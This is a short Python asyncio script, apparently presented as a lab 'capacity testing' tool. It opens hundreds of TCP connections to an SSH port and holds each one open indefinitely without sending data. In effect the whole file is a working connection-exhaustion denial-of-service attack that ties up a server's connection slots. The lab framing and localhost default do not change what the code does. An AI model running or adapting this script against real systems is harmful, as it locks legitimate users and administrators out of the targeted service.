import asyncio
import time

# Target configuration
TARGET_HOST = "127.0.0.1"  # Change to your local Lab/VM IP
TARGET_PORT = 22
MAX_CONNECTIONS = 500       # Higher concurrency limit for capacity testing
CONCURRENCY_RATE = 0.01    # Extremely short delay between attempts (seconds)

active_connections = []

async def establish_connection(connection_id):
    """Asynchronously establishes a raw TCP connection and holds it open."""
    try:
        # Asynchronously open a TCP connection (simulating the initial handshake handshake)
        reader, writer = await asyncio.open_connection(TARGET_HOST, TARGET_PORT)
        
        # Keep track of active connections for clean up
        active_connections.append(writer)
        print(f"[+] Task {connection_id}: Connection established successfully.")
        
        # Keep the connection alive without sending data (holding the resource slot)
        while True:
            await asyncio.sleep(3600)  # Sleep indefinitely to hold the socket open
            
    except asyncio.CancelledError:
        # Handle graceful shutdown when tasks are cancelled
        pass
    except Exception as e:
        print(f"[-] Task {connection_id}: Connection failed or dropped: {e}")

async def main():
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Starting high-concurrency simulation up to {MAX_CONNECTIONS} slots...")
    
    tasks = []
    
    for i in range(1, MAX_CONNECTIONS + 1):
        # Create an asynchronous task for each connection loop
        task = asyncio.create_task(establish_connection(i))
        tasks.append(task)
        
        # Control the rate of new connection attempts per second
        await asyncio.sleep(CONCURRENCY_RATE)
        
    print(f"\n[*] All tasks initiated. Monitoring active connections...")
    
    try:
        # Keep running until manually interrupted (Ctrl+C)
        while True:
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        pass

if __name__ == "__main__":
    start_time = time.time()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user. Initiating teardown protocols...")
    finally:
        # Graceful cleanup: Close all active network sockets
        print(f"[*] Closing {len(active_connections)} active connections...")
        for writer in active_connections:
            try:
                writer.close()
            except:
                pass
        print(f"[+] Cleanup completed. Execution duration: {time.time() - start_time:.2f} seconds.")
